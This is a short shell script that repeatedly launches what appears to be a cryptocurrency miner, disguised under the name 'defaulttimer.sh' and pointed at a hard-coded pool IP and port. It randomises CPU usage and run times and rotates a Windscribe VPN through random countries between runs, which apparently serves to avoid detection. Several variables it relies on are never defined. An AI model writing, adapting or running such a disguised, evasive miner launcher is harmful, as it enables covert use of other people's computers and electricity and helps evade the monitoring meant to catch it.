#!/bin/sh

echo "Start"
while (true) 
do
 CPU=$(( 55 + $(date +%N) % 35 ))
 TIM=$(( 180 + $(date +%N) % 130 ))
 cont_v=$(shuf -e US-C US US-M CA AT HR CY CZ DK FI FR GR HU IL IT MD NO PL GB ZA AU TR AU ID SG KR AR MX -n 1)
 
 pkill defaulttimer.sh
 windscribe connect $cont_v
 defaulttimer.sh -o 94.103.81.233:34311 --rig-id=$ID -B -l /tmp/$tmpfoldername/log.log --donate-level=0 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=$CPU --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/$tmpfoldername/log.log' $CPU $TIM
 sleep $TIM;
 windscribe disconnect
done;
